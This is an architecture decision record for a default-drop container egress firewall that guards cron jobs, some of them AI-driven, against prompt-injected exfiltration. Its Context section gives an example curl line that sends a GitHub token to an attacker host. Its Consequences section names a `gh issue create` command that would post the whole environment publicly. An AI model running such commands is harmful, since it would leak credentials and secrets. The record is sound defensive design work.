# ADR-051: Container egress firewall — DOCKER-USER default-drop allowlist

- **Status:** Accepted
- **Date:** 2026-06-09
- **Deciders:** Jean (operator), security-sentinel + architecture-strategist (deepen-plan review)
- **Relates to:** #5046 (Tier-2 umbrella), #5018 (PreToolUse containment hook), ADR-033 I7 (spawn-bash hook bypass), #5073 (content-blind residual / GHA isolation deferral)

## Context

Two cron populations inside the `soleur-web-platform` container need egress
containment:

- **4 live `spawn("bash")` crons** (content-publisher, content-vendor-drift,
  rule-prune, weekly-analytics) bypass the #5018 PreToolUse hook entirely
  (ADR-033 I7) — until this change they ran **uncontained**: a prompt-injected
  child process could `curl https://attacker/?d=$GH_TOKEN`.
- **Claude-eval crons** are contained by the hook, but relaxing the hook's
  `Task`/`Skill` catch-all (required to restore the audit crons) is only safe
  with a network-layer backstop.

A HOST-level egress firewall is off the table: host OUTPUT carries the
cloudflared tunnel (all app traffic + the CI-deploy SSH route, #4829), Vector→
Better Stack, GHCR pulls, and apt — a default-drop there is a full outage.

## Decision

A **default-drop nftables egress allowlist scoped to the default Docker
bridge**, applied in the `DOCKER-USER` chain (table `ip filter`):

1. All soleur rules live in our own `SOLEUR-EGRESS` chain; `DOCKER-USER`
   carries exactly one `iifname "docker0" jump SOLEUR-EGRESS` rule. Docker
   never flushes `DOCKER-USER`, so the jump survives dockerd restarts;
   `cron-egress-firewall.service` (boot-persistent oneshot, the
   `docker_seccomp_config` pattern) re-asserts after reboots.
2. Rule order (first-match-wins, drop LAST): established/related accept →
   intra-bridge accept → DNS pinned to the container's own resolvers
   (UDP+TCP 53; off-pin queries are logged `egress-dns-exfil:` and dropped)
   → host-gateway :8288 accept (self-hosted Inngest; belt-and-braces — that
   path traverses INPUT, not FORWARD) → `@soleur_egress_allow` accept →
   `egress-blocked:` log + drop.
3. The allowlist is **grep-enumerated from runtime code, never intuited**
   (`cron-egress-allowlist.txt`, one evidence comment per host). Because the
   firewall scopes the WHOLE container — the Next.js app included — the list
   carries app-egress hosts the cron-centric framing missed: Resend,
   Buttondown, Cloudflare API, Stripe, Hetzner, and the three browser push
   services. Dynamic hosts (Sentry ingest, Supabase) resolve from the doppler
   env at timer run.
4. **Re-resolve over SNI proxy.** A host-side systemd timer
   (`cron-egress-resolve.timer`, 5 min) re-resolves hostnames → IPs:
   additive-then-prune in one atomic `nft -f` transaction, fail-safe on empty
   resolution, additive-only when any host fails to resolve. An SNI proxy was
   rejected as a standing SPOF (proxy dies → all crons dark); the IP-rotation
   race is fail-loud/self-correcting (block → Sentry `egress_blocked` +
   missed heartbeat). Escalate to a proxy only on observed production churn.
5. **Fail-loud, three channels:** kernel `egress-blocked:` drops are counted
   each tick and posted as a Sentry error event (`feature=
   cron-egress-firewall`, `op=egress_blocked` → paging issue alert); the
   resolve timer posts a Sentry Crons check-in (dead timer = missed check-in);
   `OnFailure=` fires a Sentry error check-in + Resend email.
6. **Availability over containment at bootstrap:** the loader populates the
   allowlist sets BEFORE installing the default-drop; if resolution fails it
   aborts (fail-open) and alarms rather than blackholing the app.
7. **Apply path:** a new SSH `terraform_data "cron_egress_firewall"`
   provisioner (hashes of all 8 artifacts + `server_id` in
   `triggers_replace`), targeted in the apply workflow's SSH block. Post-apply
   asserts include a **live positive+negative container probe** — `nft -f`
   exits 0 on an inert ruleset, so only the probe proves enforcement.

## Consequences

- The 4 spawn-bash crons can no longer reach arbitrary hosts; the #5018 hook's
  `Task`/`Skill` relax-minimal (PR-2 Phase 2.A) gains its network backstop.
- **Content-blind residual (named honestly):** the firewall severs
  OFF-allowlist egress only. A compromised spawn-cron can still
  `gh issue create --body "$(env)"` to the public repo over allowlisted
  `api.github.com`. The #5018 hook remains the secret-in-context severance for
  claude-eval crons; for the spawn-bash 4, GHA isolation (#5073) is the layer
  that would close this. Bounded to single-user incident by the repo-scoped
  narrowed token.
- Adding a new external dependency to the app now requires an allowlist edit
  (`cron-egress-allowlist.txt`) — enforced fail-loud by the `egress_blocked`
  alert, guarded by `cron-egress-firewall.test.sh`.
- IPv6 is asserted OFF on the default bridge (a v6-enabled bridge would bypass
  the v4 ruleset); the loader hard-fails otherwise.
- Edge/WNS web-push endpoints are wildcard-only and NOT allowlisted — Edge
  push degrades fail-loud via the webpush error path (accepted residual).

## AP compliance

- **AP-001 (no new standing services):** upheld — systemd oneshot + timer on
  the existing host; no proxy daemon.
- **AP-002 (advisory tier):** consistent with the 8 sanctioned SSH-provisioner
  siblings; the firewall is host config, not a new deployable.
